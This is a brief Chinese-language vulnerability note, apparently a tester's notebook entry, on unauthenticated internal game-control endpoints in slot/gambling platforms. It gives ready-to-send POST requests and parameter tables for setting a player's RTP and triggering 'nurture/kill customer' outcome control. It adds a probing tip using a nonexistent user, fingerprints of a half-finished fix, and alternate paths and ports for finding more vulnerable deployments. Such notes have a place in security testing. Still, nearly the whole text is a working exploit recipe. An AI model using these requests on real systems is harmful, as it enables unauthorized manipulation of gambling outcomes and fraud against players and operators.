## 2026-10 未授权游戏点控 / 养客杀客（ttzslots 类）
后台 `/kagame` 的同源接口去掉 `/admin` 前缀即对外暴露，无需登录、不受 IP 白名单：

```
POST /gameInternal/v1/pointControl
{"uname":"<UID>","switchType":2,"controlType":0,"rtp":300}
```
| 字段 | 值 |
|---|---|
| switchType | 2 开 / 1 关 |
| controlType | 0 软控 / 1 硬控 |
| rtp | 软控 100/200/300 可，350+ 失败；硬控仅 ≤99 |

```
POST /gameInternal/v1/controlSet      {"uname":"<UID>","amount":400000000,"type":14,"patronType":2}
POST /gameInternal/v1/cancelControlSet {"uname":"<UID>"}
POST /gameInternal/v1/raisingCustomerAuto {"patronStatus":1,"isCancelAll":0,"patronAmount":250000000,"partonType":0}
```
- `type` 14 养客 / 15 杀客；`amount` = 目标金额 × **10000**（后台 `Math.round(o*1e4)`）
- `patronType` 0 快速 / 1 慢速 / 2 极速；`partonType` 拼写就是源码如此
- 成功回包 `{"code":200,"message":"success","data":"success"}`
- 验证口径：先用**不存在**的 userId 测接口是否存在（回 success = 未校验用户），不要直接改真实玩家
- 修复后特征：加 `secret` 头但实现不完整 → 缺头 NPE、错头 500，仍可判接口未下线
- 变体：`/api/gameInternal/*`、`/internal/game/*`、8081/8082 旁口去掉 admin 前缀
